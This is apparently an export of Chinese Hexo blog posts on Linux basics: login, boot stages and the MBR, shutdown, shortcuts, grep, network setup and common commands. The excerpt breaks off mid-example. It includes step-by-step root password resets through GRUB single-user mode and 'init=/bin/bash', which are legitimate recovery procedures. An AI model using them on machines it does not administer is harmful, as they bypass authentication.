<p>对于运行级别为5的图形方式用户来说，他们的登录是通过一个图形化的登录界面。登录成功后可以直接进入 KDE、Gnome 等窗口管理器。</p>
<p>而本文主要讲的还是文本方式登录的情况：当我们看到mingetty的登录界面时，我们就可以输入用户名和密码来登录系统了。</p>
<p>Linux 的账号验证程序是login，login会接收mingetty传来的用户名作为用户名参数。</p>
<p>然后login会对用户名进行分析：如果用户名不是root，且存在 /etc/nologin 文件，login 将输出 nologin 文件的内容，然后退出。</p>
<p>这通常用来系统维护时防止非root用户登录。只有/etc/securetty中登记了的终端才允许 root 用户登录，如果不存在这个文件，则root用户可以在任何终端上登录。</p>
<p>/etc/usertty文件用于对用户作出附加访问限制，如果不存在这个文件，则没有其他限制。</p>
<h3 id="图形模式与文字模式的切换方式">图形模式与文字模式的切换方式</h3>
<p>Linux预设提供了六个命令窗口终端机让我们来登录。</p>
<p>默认我们登录的就是第一个窗口，也就是tty1，这个六个窗口分别为tty1,tty2 … tty6，你可以按下Ctrl + Alt + F1 ~ F6 来切换它们。</p>
<p>如果你安装了图形界面，默认情况下是进入图形界面的，此时你就可以按Ctrl + Alt + F1 ~ F6来进入其中一个命令窗口界面。</p>
<p>当你进入命令窗口界面后再返回图形界面只要按下Ctrl + Alt + F7 就回来了。</p>
<p>如果你用的vmware 虚拟机，命令窗口切换的快捷键为 Alt + Space + F1~F6. 如果你在图形界面下请按Alt + Shift + Ctrl + F1~F6 切换至命令窗口。</p>
<h3 id="login-shell">login shell</h3>
<p><img src="/posts/26e49edf//872c2da6d598914d7f05730635b2f8f4.png" alt="1574413231936"></p>
<p>shell，简单说就是命令行界面，让用户可以直接与操作系统对话。用户登录时打开的shell，就叫做login shell。</p>
<p>（1）命令行登录：首先读入 /etc/profile，这是对所有用户都有效的配置；然后依次寻找下面三个文件，这是针对当前用户的配置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/.bash_profile</span><br><span class="line">~/.bash_login</span><br><span class="line">~/.profile</span><br></pre></td></tr></table></figure>
<p>需要注意的是，这三个文件只要有一个存在，就不再读入后面的文件了。比如，要是 ~/.bash_profile 存在，就不会再读入后面两个文件了。</p>
<p>（2）ssh登录：与第一种情况完全相同。</p>
<p>（3）图形界面登录：只加载 /etc/profile 和 /.profile。也就是说，/.bash_profile 不管有没有，都不会运行。</p>
<h3 id="Linux关机">Linux关机</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sync</span> 将数据由内存同步到硬盘中。</span><br><span class="line"></span><br><span class="line">shutdown 关机指令，你可以man shutdown 来看一下帮助文档。例如你可以运行如下命令关机：</span><br><span class="line">shutdown –h 10 <span class="string">&#x27;This server will shutdown after 10 mins&#x27;</span> 计算机将在10分钟后关机，并且显示信息在登陆用户的当前屏幕中。</span><br><span class="line">shutdown –h now 立马关机</span><br><span class="line">shutdown –h 20:25 系统会在今天20:25关机</span><br><span class="line">shutdown –h +10 十分钟后关机</span><br><span class="line">shutdown –r now 系统立马重启</span><br><span class="line">shutdown –r +10 系统十分钟后重启</span><br><span class="line">reboot 就是重启，等同于 shutdown –r now</span><br><span class="line">halt 关闭系统，等同于shutdown –h now 和 poweroff</span><br></pre></td></tr></table></figure>
<p>最后总结一下，不管是重启系统还是关闭系统，首先要运行<strong>sync</strong>命令，把内存中的数据写到磁盘中。</p>
<p>关机的命令有 <strong>shutdown –h now halt poweroff</strong> 和 <strong>init 0</strong> , 重启系统的命令有 <strong>shutdown –r now reboot init 6</strong>。</p>
<h3 id="计算机启动的流程">计算机启动的流程</h3>
<p><img src="/posts/26e49edf//02c50cf1205162dd0365613fb883ab8f.png" alt="img"></p>
<p>boot是bootstrap（鞋带）的缩写，它来自一句谚语：</p>
<blockquote>
<p>“pull oneself up by one’s bootstraps”</p>
</blockquote>
<p>字面意思是&quot;拽着鞋带把自己拉起来&quot;，这当然是不可能的事情。最早的时候，工程师们用它来比喻，计算机启动是一个很矛盾的过程：必须先运行程序，然后计算机才能启动，但是计算机不启动就无法运行程序！</p>
<p>早期真的是这样，必须想尽各种办法，把一小段程序装进内存，然后计算机才能正常运行。所以，工程师们把这个过程叫做&quot;拉鞋带&quot;，久而久之就简称为boot了。</p>
<p>计算机的整个启动过程分成四个阶段。</p>
<h4 id="第一阶段：BIOS">第一阶段：BIOS</h4>
<p>上个世纪70年代初，“只读内存”（read-only memory，缩写为ROM）发明，开机程序被刷入ROM芯片，计算机通电后，第一件事就是读取它。</p>
<p>BIOS全称是Basic Input/Output System，即基本输入输出系统，即下图芯片里的程序。</p>
<p><img src="/posts/26e49edf//3dc7f4a1ecf351ad1f46804e0e985f4c.png" alt="1574408997299"></p>
<p><strong>硬件自检</strong></p>
<p>BIOS程序首先检查，计算机硬件能否满足运行的基本条件，这叫做&quot;硬件自检&quot;（Power-On Self-Test），缩写为<a href="http://en.wikipedia.org/wiki/Power-on_self-test">POST</a>。</p>
<p>如果硬件出现问题，主板会发出不同含义的<a href="http://en.wikipedia.org/wiki/Power-on_self-test#Original_IBM_POST_beep_codes">蜂鸣</a>，启动中止。如果没有问题，屏幕就会显示出CPU、内存、硬盘等信息。</p>
<p><img src="/posts/26e49edf//cd9cc5ec847de974c916cd5cf3bc9614.png" alt="1574409216362"></p>
<p><strong>启动顺序</strong></p>
<p>硬件自检完成后，BIOS把控制权转交给下一阶段的启动程序。</p>
<p>下一阶段的启动程序根据BIOS设置项Boot Sequence（启动顺序）决定，排在前面的设备就是优先转交控制权的设备。</p>
<p><img src="/posts/26e49edf//83c7c00552e551c8fa859db5277e7103.png" alt="1574409397609"></p>
<h4 id="第二阶段：-主引加粗样式导记录">第二阶段： 主引加粗样式导记录</h4>
<p>BIOS按照&quot;启动顺序&quot;，把控制权转交给排在第一位的储存设备。</p>
<p>这时，计算机读取该设备的第一个扇区，也就是读取最前面的512个字节。如果这512个字节的最后两个字节是0x55和0xAA，表明这个设备可以用于启动；如果不是，表明设备不能用于启动，控制权于是被转交给&quot;启动顺序&quot;中的下一个设备。</p>
<p>这最前面的512个字节，就叫做<a href="http://en.wikipedia.org/wiki/Master_boot_record">&quot;主引导记录&quot;</a>（Master boot record，缩写为MBR）。</p>
<p><strong>主引导记录组成</strong></p>
<p>主引导记录由三个部分组成：</p>
<blockquote>
<p>（1） 第1-446字节：调用操作系统的机器码。</p>
<p>（2） 第447-510字节：分区表（Partition table），共64字节。</p>
<p>（3） 第511-512字节：主引导记录签名（0x55和0xAA）。</p>
</blockquote>
<p>其中，第二部分&quot;分区表&quot;的作用，是将硬盘分成若干个区。</p>
<p><strong>分区表</strong></p>
<p>硬盘分区有很多好处。每个分区可以安装不同的操作系统，&quot;主引导记录&quot;因此必须知道将控制权转交给哪个区。</p>
<p>分区表的长度只有64个字节，里面又分成四项，每项16个字节。所以，一个硬盘最多只能分四个一级分区，又叫做&quot;主分区&quot;。</p>
<p>每个主分区的16个字节，由6个部分组成：</p>
<blockquote>
<p>（1） 第1个字节：如果为0x80，就表示该主分区是激活分区，控制权要转交给这个分区。四个主分区里面只能有一个是激活的。</p>
<p>（2） 第2-4个字节：主分区第一个扇区的物理位置（柱面、磁头、扇区号等等）。</p>
<p>（3） 第5个字节：<a href="http://en.wikipedia.org/wiki/Partition_type">主分区类型</a>。</p>
<p>（4） 第6-8个字节：主分区最后一个扇区的物理位置。</p>
<p>（5） 第9-12字节：该主分区第一个扇区的逻辑地址。</p>
<p>（6） 第13-16字节：主分区的扇区总数。</p>
</blockquote>
<p>最后的四个字节（“主分区的扇区总数”），决定了这个主分区的长度。也就是说，一个主分区的扇区总数最多不超过2的32次方。</p>
<p>如果每个扇区为512个字节，就意味着单个分区最大不超过2TB。再考虑到扇区的逻辑地址也是32位，所以单个硬盘可利用的空间最大也不超过2TB。如果想使用更大的硬盘，只有2个方法：一是提高每个扇区的字节数，二是<a href="http://en.wikipedia.org/wiki/GUID_Partition_Table">增加扇区总数</a>。</p>
<h4 id="第三阶段：硬盘启动">第三阶段：硬盘启动</h4>
<p>这时，计算机的控制权就要转交给硬盘的某个分区了，这里又分成三种情况。</p>
<p><strong>情况A：卷引导记录</strong></p>
<p>上一节提到，四个主分区里面，只有一个是激活的。计算机会读取激活分区的第一个扇区，叫做<a href="http://en.wikipedia.org/wiki/Volume_Boot_Record">&quot;卷引导记录</a>&quot;（Volume boot record，缩写为VBR）。</p>
<p>&quot;卷引导记录&quot;的主要作用是，告诉计算机，操作系统在这个分区里的位置。然后，计算机就会加载操作系统了。</p>
<p><strong>情况B：扩展分区和逻辑分区</strong></p>
<p>随着硬盘越来越大，四个主分区已经不够了，需要更多的分区。但是，分区表只有四项，因此规定有且仅有一个区可以被定义成&quot;扩展分区&quot;（Extended partition）。</p>
<p>所谓&quot;扩展分区&quot;，就是指这个区里面又分成多个区。这种分区里面的分区，就叫做&quot;逻辑分区&quot;（logical partition）。</p>
<p>计算机先读取扩展分区的第一个扇区，叫做<a href="http://en.wikipedia.org/wiki/Extended_partition">&quot;扩展引导记录&quot;</a>（Extended boot record，缩写为EBR）。它里面也包含一张64字节的分区表，但是最多只有两项（也就是两个逻辑分区）。</p>
<p>计算机接着读取第二个逻辑分区的第一个扇区，再从里面的分区表中找到第三个逻辑分区的位置，以此类推，直到某个逻辑分区的分区表只包含它自身为止（即只有一个分区项）。因此，扩展分区可以包含无数个逻辑分区。</p>
<p>但是，似乎很少通过这种方式启动操作系统。如果操作系统确实安装在扩展分区，一般采用下一种方式启动。</p>
<p><strong>情况C：启动管理器</strong></p>
<p>在这种情况下，计算机读取&quot;主引导记录&quot;前面446字节的机器码之后，不再把控制权转交给某一个分区，而是运行事先安装的<a href="http://en.wikipedia.org/wiki/Boot_loader#Modern_boot_loaders">&quot;启动管理器&quot;</a>（boot loader），由用户选择启动哪一个操作系统。</p>
<p>Linux环境中的启动管理器例如<a href="http://en.wikipedia.org/wiki/GNU_GRUB">Grub</a>。</p>
<p><img src="/posts/26e49edf//0eba97ff505cb05cb14ea86c7b1fec93.png" alt="1574410612420"></p>
<h4 id="第四阶段：操作系统">第四阶段：操作系统</h4>
<p>控制权转交给操作系统后，操作系统的内核首先被载入内存。</p>
<p>以Linux系统为例，先载入/boot目录下面的kernel。内核加载成功后，第一个运行的程序是/sbin/init。它根据配置文件（Debian系统是/etc/initab）产生init进程。这是Linux启动后的第一个进程，pid进程编号为1，其他进程都是它的后代。</p>
<p>然后，init线程加载系统的各个模块，比如窗口程序和网络程序，直至执行/bin/login程序，跳出登录界面，等待用户输入用户名和密码。</p>
<p>至此，全部启动过程完成。</p>
<h3 id="单用户模式修改Centos系统root密码">单用户模式修改Centos系统root密码</h3>
<p>步骤如下：</p>
<p>重启linux系统</p>
<p><img src="/posts/26e49edf//b4ff39b063d3a2da3580bc94930ed01e.png" alt="4_21"></p>
<p>3 秒之内要按一下回车，出现如下界面</p>
<p><img src="/posts/26e49edf//67849db77018ceba958128dde3394dea.png" alt="4_22"></p>
<p>按向下方向键移动到第二行，按&quot;e&quot;进入编辑模式</p>
<p><img src="/posts/26e49edf//86c2fc832669cfbe4fad0ff747dddc76.png" alt="4_23"></p>
<p>在 第二行最后边输入 single，用空格与前面内容隔开</p>
<p><img src="/posts/26e49edf//e1a541c56549ab770ba103ee88686a9c.png" alt="4_24"></p>
<p>回车</p>
<p><img src="/posts/26e49edf//9095c7353ef32c132b4e34c7ba1fdedc.png" alt="4_25"></p>
<p>最后按&quot;b&quot;启动，启动后就进入了单用户模式了</p>
<p><img src="/posts/26e49edf//ccbc8027a3d2a1ca079bdc3dd29ee3fd.png" alt="4_26"></p>
<p>进入到单用户模式后，就可以使用passwd命令任意更改root密码了：</p>
<p><img src="/posts/26e49edf//7b86f9afd2569841fe290d0d843aa3d7.png" alt="4_27"></p>
<h3 id="救援模式修改Ubuntu系统root密码">救援模式修改Ubuntu系统root密码</h3>
<p>重启，按住shift键，出现如下界面，选中如下选项</p>
<p><img src="/posts/26e49edf//190138072fab9c55fddac036a934c26d.jpeg" alt="img"></p>
<p>按回车键进入如下界面，然后选中最新的recovery mode选项</p>
<p><img src="/posts/26e49edf//02e68b1361efb698209cbe4573ff1158.jpeg" alt="img"></p>
<p>按e进入如下界面，找到图中红色框的recovery nomodeset并将其删掉，再在这一行的后面输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">quiet splash rw init=/bin/bash</span><br></pre></td></tr></table></figure>
<p><img src="/posts/26e49edf//788cbb9e3090ad75aa67cd51011a8633.jpeg" alt="img"></p>
<p><img src="/posts/26e49edf//73412c34d5fa9a4b55add0b77ad008d6.jpeg" alt="img"></p>
<p>接着按F10或者Ctrl+x 后出现如下界面，在命令行内输入passwd后进行修改密码即可</p>
<p><img src="/posts/26e49edf//e2a2b2f6ce4531eab5bd71d51e4caee1.jpeg" alt="img"></p>
<p>修改完之后重启系统。</p>
<p>本文参考：</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】Linux简介</title>
    <url>/posts/499dd9b6/</url>
    <content><![CDATA[<h2 id="Linux命令行快捷键">Linux命令行快捷键</h2>
<ul class="lvl-0">
<li class="lvl-2">Ctrl+c 结束正在运行的程序</li>
<li class="lvl-2">Ctrl+d 结束输入或退出shell</li>
<li class="lvl-2">Ctrl+s 暂停屏幕输出【锁住终端】</li>
<li class="lvl-2">Ctrl+q 恢复屏幕输出【解锁终端】</li>
<li class="lvl-2">Ctrl+l 清屏，【是字母L的小写】等同于Clear</li>
<li class="lvl-2">当前光标到行首：ctrl+a</li>
<li class="lvl-2">当前光标到行尾：ctrl+e</li>
<li class="lvl-2">删除当前光标到行首：ctrl+u</li>
<li class="lvl-2">删除当前光标到行尾：ctrl+k</li>
<li class="lvl-2">Ctrl+y 在光标处粘贴剪切的内容</li>
<li class="lvl-2">Ctrl+r 查找历史命令【输入关键字，就能调出以前执行过的命令】</li>
<li class="lvl-2">Ctrl+t 调换光标所在处与其之前字符位置，并把光标移到下个字符</li>
<li class="lvl-2">Ctrl+x+u 撤销操作</li>
<li class="lvl-2">Ctrl+z 转入后台运行</li>
</ul>
<p><strong>Tips:</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Linux命令格式：<code>command  [-options]  [parameter1]  …</code></p>
</li>
<li class="lvl-2">
<p>帮助文档help：<code>command --help</code>或<code>command -h</code></p>
</li>
<li class="lvl-2">
<p><code>tab</code>键在敲命令式可以补全命令或文件名</p>
</li>
<li class="lvl-2">
<p>直接使用命令<code>cd</code>可以进入当前用户的家目录</p>
</li>
<li class="lvl-2">
<p>文件颜色及其含义</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>文件的颜色</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>蓝色</td>
<td>目录</td>
</tr>
<tr>
<td>绿色</td>
<td>可执行文件</td>
</tr>
<tr>
<td>红色</td>
<td>压缩文件</td>
</tr>
<tr>
<td>浅蓝色</td>
<td>链接文件</td>
</tr>
<tr>
<td>灰色</td>
<td>其他文件</td>
</tr>
</tbody>
</table>
<h2 id="正则表达式">正则表达式</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">规则：</span><br><span class="line">.  : 任意一个字符</span><br><span class="line">a* : 任意多个a(零个或多个a)</span><br><span class="line">a? : 零个或一个a</span><br><span class="line">a+ : 一个或多个a</span><br><span class="line">.* : 任意多个任意字符</span><br><span class="line">\. : 转义.</span><br><span class="line">\&lt;h.*p\&gt; ：以h开头，p结尾的一个单词</span><br><span class="line">o\&#123;2\&#125; : o重复两次</span><br><span class="line"></span><br><span class="line">grep <span class="string">&#x27;^i.\&#123;18\&#125;n$&#x27;</span> /usr/share/dict/words</span><br><span class="line"></span><br><span class="line">查找不是以#开头的行</span><br><span class="line">grep -v <span class="string">&#x27;^#&#x27;</span> a.txt | grep -v <span class="string">&#x27;^$&#x27;</span> </span><br><span class="line"></span><br><span class="line">以h或r开头的</span><br><span class="line">grep <span class="string">&#x27;^[hr]&#x27;</span> /etc/passwd</span><br><span class="line"></span><br><span class="line">不是以h和r开头的</span><br><span class="line">grep <span class="string">&#x27;^[^hr]&#x27;</span> /etc/passwd</span><br><span class="line"></span><br><span class="line">不是以h到r开头的</span><br><span class="line">grep <span class="string">&#x27;^[^h-r]&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure>
<h2 id="Linux的基本配置">Linux的基本配置</h2>
<p>1.修改主机名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/network</span><br><span class="line">NETWORKING=<span class="built_in">yes</span></span><br><span class="line">HOSTNAME=hadoop1</span><br></pre></td></tr></table></figure>
<p>2.修改ip地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">DEVICE=eth0</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">ONBOOT=<span class="built_in">yes</span></span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR=192.168.100.101</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line"></span><br><span class="line">service network restart</span><br></pre></td></tr></table></figure>
<p>3.修改ip地址和主机名的映射关系</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.100.101 hadoop1</span><br></pre></td></tr></table></figure>
<p>4.关闭iptables并设置其开机启动/不启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service iptables stop</span><br><span class="line">chkconfig iptables on</span><br><span class="line">chkconfig iptables off</span><br></pre></td></tr></table></figure>
<h2 id="man手册">man手册</h2>
<p>man是linux提供的一个手册，包含了绝大部分的命令、函数使用说明</p>
<p>该手册分成很多章节（section），使用man时可以指定不同的章节来浏览。</p>
<p>例：man ls ; man 2 printf</p>
<p>man中各个section意义如下：</p>
<ol>
<li class="lvl-3">
<p>Standard commands（标准命令）</p>
</li>
<li class="lvl-3">
<p>System calls（系统调用，如open,write）</p>
</li>
<li class="lvl-3">
<p>Library functions（库函数，如printf,fopen）</p>
</li>
<li class="lvl-3">
<p>Special devices（设备文件的说明，/dev下各种设备）</p>
</li>
<li class="lvl-3">
<p>File formats（文件格式，如passwd）</p>
</li>
<li class="lvl-3">
<p>Games and toys（游戏和娱乐）</p>
</li>
<li class="lvl-3">
<p>Miscellaneous（杂项、惯例与协定等，例如Linux档案系统、网络协定、ASCII 码；environ全局变量）</p>
</li>
<li class="lvl-3">
<p>Administrative Commands（管理员命令，如ifconfig）</p>
</li>
</ol>
<p>man是按照手册的章节号的顺序进行搜索的。</p>
<p>man设置了如下的功能键：</p>
<table>
<thead>
<tr>
<th>功能键</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>空格键</td>
<td>显示手册页的下一屏</td>
</tr>
<tr>
<td>Enter键</td>
<td>一次滚动手册页的一行</td>
</tr>
<tr>
<td>b</td>
<td>回滚一屏</td>
</tr>
<tr>
<td>f</td>
<td>前滚一屏</td>
</tr>
<tr>
<td>q</td>
<td>退出man命令</td>
</tr>
<tr>
<td>h</td>
<td>列出所有功能键</td>
</tr>
<tr>
<td>/word</td>
<td>搜索word字符串</td>
</tr>
</tbody>
</table>
<p><img src="/posts/499dd9b6//eaa669cc38073241cb90af97af43bc92.png" alt="img"></p>
<p>注意：实际上，我们不用指定第几个章节也用查看，如，man ls</p>
<h2 id="history游览历史">history游览历史</h2>
<p>当系统执行过一些命令后，可按上下键翻看以前的命令，history将执行过的命令列举出来</p>
<p>history保留了最近执行的命令记录，默认可以保留1000。历史清单从0开始编号到最大值。常见用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span> N		显示最近N条命令</span><br><span class="line"><span class="built_in">history</span> -c		清除所有的历史记录</span><br><span class="line"><span class="built_in">history</span> -w  xxx.txt	保存历史记录到文本xxx.txt</span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Hexo】博客复制粘贴</title>
    <url>/posts/4fb642e/</url>
    <content><![CDATA[<p>本文介绍使用chrom浏览器，在源码中copy element可以将博客复制下来，直接粘贴到自己的博客里。方便后期的更改。</p>
<ol>
<li class="lvl-3">首先,在自己喜欢的博客页面,点击鼠标右键,看到如下图片,点击最后一行<code>检查</code></li>
</ol>
<p><img src="/posts/4fb642e//image-20250218162611570.png" alt="image-20250218162611570"></p>
<ol start="2">
<li class="lvl-3">
<p>然后,在右边的源码里边,找到&quot;article_content&quot;标签头,可以看到左侧部分的预览界面被选中的部分就是要复制粘贴文章(包括html部分),检查左侧被选中的部分是否是自己想要的部分.</p>
</li>
</ol>
<p><img src="/posts/4fb642e//image-20250218163315027.png" alt="image-20250218163315027"></p>
<ol start="3">
<li class="lvl-3">
<p>之后,再右键选择该标签(“article_content”),如下图,选择Copy element复制(或者Cut element 剪切)该标签下的所有元素</p>
</li>
</ol>
<p><img src="/posts/4fb642e//image-20250218163453271.png" alt="image-20250218163453271"></p>
<ol start="4">
<li class="lvl-3">
<p>新建一个 txt 文件，将后缀改为 .html ，把刚复制的 源代码 粘贴到文件中，浏览器打开后如下图，此时复制全文到markdown的软件<a href="https://www.typora.io/">Typora</a>中</p>
</li>
</ol>
<p><img src="/posts/4fb642e//image-20250220122601039.png" alt="image-20250220122601039"></p>
<p>本文参考：</p>
<p><a href="https://blog.csdn.net/qq_36437693/article/details/127286941">如何csdn复制他人博客文章到自己博客下</a></p>
]]></content>
      <categories>
        <category>博客写作</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】Linux总结</title>
    <url>/posts/2c8b313c/</url>
    <content><![CDATA[<h2 id="linux命令练习">linux命令练习</h2>
<h3 id="常用命令">常用命令</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.进入到用户根目录</span><br><span class="line"><span class="built_in">cd</span> ~ 或 <span class="built_in">cd</span></span><br><span class="line"></span><br><span class="line">2.查看当前所在目录</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">3.进入到hadoop用户根目录</span><br><span class="line"><span class="built_in">cd</span> ~hadoop</span><br><span class="line"></span><br><span class="line">4.返回到原来目录</span><br><span class="line"><span class="built_in">cd</span> -</span><br><span class="line"></span><br><span class="line">5.返回到上一级目录</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line">6.查看hadoop用户根目录下的所有文件</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line"></span><br><span class="line">7.在根目录下创建一个hadoop的文件夹</span><br><span class="line"><span class="built_in">mkdir</span> /hadoop</span><br><span class="line"></span><br><span class="line">8.在/hadoop目录下创建src和WebRoot两个文件夹</span><br><span class="line">分别创建：<span class="built_in">mkdir</span> /hadoop/src</span><br><span class="line">		  <span class="built_in">mkdir</span> /hadoop/WebRoot</span><br><span class="line">同时创建：<span class="built_in">mkdir</span> /hadoop/&#123;src,WebRoot&#125;</span><br><span class="line"></span><br><span class="line">进入到/hadoop目录，在该目录下创建.classpath和README文件</span><br><span class="line">分别创建：<span class="built_in">touch</span> .classpath</span><br><span class="line">		  <span class="built_in">touch</span> README</span><br><span class="line">同时创建：<span class="built_in">touch</span> &#123;.classpath,README&#125;</span><br><span class="line"></span><br><span class="line">查看/hadoop目录下面的所有文件</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line"></span><br><span class="line">在/hadoop目录下面创建一个test.txt文件,同时写入内容<span class="string">&quot;this is test&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;this is test&quot;</span> &gt; test.txt</span><br><span class="line"></span><br><span class="line">查看一下test.txt的内容</span><br><span class="line"><span class="built_in">cat</span> test.txt</span><br><span class="line">more test.txt</span><br><span class="line">less test.txt</span><br><span class="line"></span><br><span class="line">向README文件追加写入<span class="string">&quot;please read me first&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;please read me first&quot;</span> &gt;&gt; README</span><br><span class="line"></span><br><span class="line">将test.txt的内容追加到README文件中</span><br><span class="line"><span class="built_in">cat</span> test.txt &gt;&gt; README</span><br><span class="line"></span><br><span class="line">拷贝/hadoop目录下的所有文件到/hadoop-bak</span><br><span class="line"><span class="built_in">cp</span> -r /hadoop /hadoop-bak</span><br><span class="line"></span><br><span class="line">进入到/hadoop-bak目录，将test.txt移动到src目录下，并修改文件名为Student.java</span><br><span class="line"><span class="built_in">mv</span> test.txt src/Student.java</span><br><span class="line"></span><br><span class="line">在src目录下创建一个struts.xml</span><br><span class="line">&gt; struts.xml</span><br><span class="line"></span><br><span class="line">删除所有的xml类型的文件</span><br><span class="line"><span class="built_in">rm</span> -rf *.xml</span><br><span class="line"></span><br><span class="line">删除/hadoop-bak目录和下面的所有文件</span><br><span class="line"><span class="built_in">rm</span> -rf /hadoop-bak</span><br><span class="line"></span><br><span class="line">返回到/hadoop目录，查看一下README文件有多单词，多少个少行</span><br><span class="line"><span class="built_in">wc</span> -w README</span><br><span class="line"><span class="built_in">wc</span> -l README</span><br><span class="line"></span><br><span class="line">返回到根目录，将/hadoop目录先打包，再用gzip压缩</span><br><span class="line">分步完成：tar -cvf hadoop.tar hadoop</span><br><span class="line">		  gzip hadoop.tar</span><br><span class="line">一步完成：tar -zcvf hadoop.tar.gz hadoop</span><br><span class="line">		  </span><br><span class="line">将其解压缩，再取消打包</span><br><span class="line">分步完成：gzip -d hadoop.tar.gz 或 gunzip hadoop.tar.gz</span><br><span class="line">一步完成：tar -zxvf hadoop.tar.gz</span><br><span class="line"></span><br><span class="line">将/hadoop目录先打包，同时用bzip2压缩，并保存到/tmp目录下</span><br><span class="line">tar -jcvf /tmp/hadoop.tar.bz2 hadoop</span><br><span class="line"></span><br><span class="line">将/tmp/hadoop.tar.bz2解压到/usr目录下面</span><br><span class="line">tar -jxvf hadoop.tar.bz2 -C /usr/</span><br><span class="line">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081</span><br></pre></td></tr></table></figure>
<h3 id="系统命令">系统命令</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.查看主机名</span><br><span class="line">hostname</span><br><span class="line"></span><br><span class="line">2.修改主机名(重启后无效)</span><br><span class="line">hostname hadoop</span><br><span class="line"></span><br><span class="line">3.修改主机名(重启后永久生效)</span><br><span class="line">vi /ect/sysconfig/network</span><br><span class="line"></span><br><span class="line">4.修改IP(重启后无效)</span><br><span class="line">ifconfig eth0 192.168.12.22</span><br><span class="line"></span><br><span class="line">5.修改IP(重启后永久生效)</span><br><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line"></span><br><span class="line">6.查看系统信息</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"></span><br><span class="line">7.查看ID命令</span><br><span class="line"><span class="built_in">id</span> -u</span><br><span class="line"><span class="built_in">id</span> -g</span><br><span class="line"></span><br><span class="line">8.日期</span><br><span class="line"><span class="built_in">date</span></span><br><span class="line"><span class="built_in">date</span> +%Y-%m-%d</span><br><span class="line"><span class="built_in">date</span> +%T</span><br><span class="line"><span class="built_in">date</span> +%Y-%m-%d<span class="string">&quot; &quot;</span>%T</span><br><span class="line"></span><br><span class="line">9.日历</span><br><span class="line">cal 2012</span><br><span class="line"></span><br><span class="line">10.查看文件信息</span><br><span class="line">file filename</span><br><span class="line"></span><br><span class="line">11.挂载硬盘</span><br><span class="line">mount</span><br><span class="line">umount</span><br><span class="line">加载windows共享</span><br><span class="line">mount -t cifs //192.168.1.100/tools /mnt</span><br><span class="line"></span><br><span class="line">12.查看文件大小</span><br><span class="line"><span class="built_in">du</span> -h</span><br><span class="line"><span class="built_in">du</span> -ah</span><br><span class="line"></span><br><span class="line">13.查看分区</span><br><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"></span><br><span class="line">14.ssh</span><br><span class="line">ssh hadoop@192.168.1.1</span><br><span class="line"></span><br><span class="line">15.关机</span><br><span class="line">shutdown -h now /init 0</span><br><span class="line">shutdown -r now /reboot</span><br><span class="line">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354</span><br></pre></td></tr></table></figure>
<h3 id="查看版本信息">查看版本信息</h3>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、查看当前操作系统内核信息</span><br><span class="line">uname -a</span><br><span class="line">$ uname -a</span><br><span class="line">zhang@rocky9:~$ uname -a</span><br><span class="line">Linux rocky9 <span class="number">5.14</span><span class="number">.0</span><span class="number">-284.11</span><span class="number">.1</span>.el9_2.x86_64 #<span class="number">1</span> SMP PREEMPT_DYNAMIC Tue May <span class="number">9</span> <span class="number">17</span>:<span class="number">09</span>:<span class="number">15</span> UTC <span class="number">2023</span> x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、查看当前操作系统版本信息</span><br><span class="line">cat /<span class="keyword">proc</span>/version</span><br><span class="line">$<span class="title"> cat</span> /<span class="keyword">proc</span>/version<span class="title"></span></span><br><span class="line"><span class="title">Linux</span> version 3.10.0-693.21.1.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc<span class="title"> version</span> 4.8.5 20150623 (Red<span class="title"> Hat</span> 4.8.5-16) (GCC) ) #1<span class="title"> SMP</span> Wed<span class="title"> Mar</span> 7 19:03:37<span class="title"> 